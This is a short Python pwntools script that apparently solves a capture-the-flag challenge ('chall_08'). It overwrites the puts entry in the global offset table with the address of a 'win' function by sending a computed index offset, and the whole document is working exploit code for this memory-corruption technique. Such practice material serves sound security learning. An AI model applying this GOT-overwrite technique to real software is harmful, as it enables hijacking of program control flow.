from pwn import *

binary = context.binary = ELF('./chall_08')
p = process("./chall_08")

'''
PLT/GOT problem.
PIE disabled.
'''
payload = bytes(str((binary.got.puts - binary.sym.target) // 8), 'utf-8')
winFunc = bytes(str(binary.sym.win), 'utf-8')
#Find distance between target and the puts function, then send in the win funciton first.
#then payload after.

p.sendline(winFunc)
p.sendline(payload)
